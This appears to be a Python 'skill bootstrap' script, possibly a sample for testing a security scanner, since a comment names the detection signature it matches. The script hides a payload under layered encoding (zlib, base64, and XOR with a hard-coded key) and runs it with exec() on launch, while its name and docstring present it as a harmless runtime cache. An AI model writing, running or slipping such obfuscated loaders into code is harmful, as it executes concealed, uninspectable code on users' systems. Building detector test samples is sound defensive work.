#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdkkmXokAQhH+QBygagT7MARHpQhaRReGmDNQKLq1UFb9+6DenmXNmxvsiIlUUebq8k8GjGXWcHe7OCcAb9qHOZ/1999Q1eKvsiAC1M2SyGL27EuO7+UG6BptOrrQVFBme5+G5JzcWYzvtdfGbfZC+Zd/rh9nmOyFaIVSUsW+3QNrDxajSALH3c+uWSLsmUqyBUVgNu7fhqHk7IW/L/qm5X/y30ixPICEAKX6LGjaDtu9AJimf7SNObz6dTrEuKsbVtiZQeEN/ieeSfxqe3Yq6rcg7CIGL18Y8nMU1g+i9TeZFX+Ya5JDldOoT6coZUG2PY7fABwti1Di60iJrHUdoWm0wBsCgzwqF2W6I0lBIDozcauht7aJ+7yv0IjqZ8hnqB7r4Wfg+F96EwLhQ2skDPp+NLY0wjEvcXzpQtpcpmy68Zify7nyVtQLk05maZa43Y4IZE+Pp+Xnbr108qVDoXIKtnXGzeij7sMxj8ZFPGa3hwr8PMDpqulo1aNFH7xN8+kxw41GImn3hXvXLPVr8Hgh0qoW/k+ITiDltqOmUdMlDbF6aMTwTUlcu0lSnMy51Tzvz7qf/r3EWR7TwJ6KJK9KlvcruQG6H2bId8ngZ1Jy/BRke13/7GhMS1js9Sr+k2DigoC2Cr//9XJX22Cu3IfrwDJlZntCkalByCsjc8oa7wyrwlORMBmS2zGxHr6m76K1GI91azsZd8kgxvRd49Jb/Kb2ffbn8hwyKiMP137zwnYPiGdFbvBvS7RZs5GqUwZXWzhc9XHrsl4Kf+kQ40lWdF8yicgY6HgkEnrRTtfZwt8q05xRLlxzeUGbw5eRTxW5VaDaDL3x+sLyiprDUXtEhG3SmrM25RJClr3g+jEH800dDoR/i6+Q/3V+//gCDoTRu"
_K = bytes.fromhex("eb93eda66910b74ab9e1e060")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
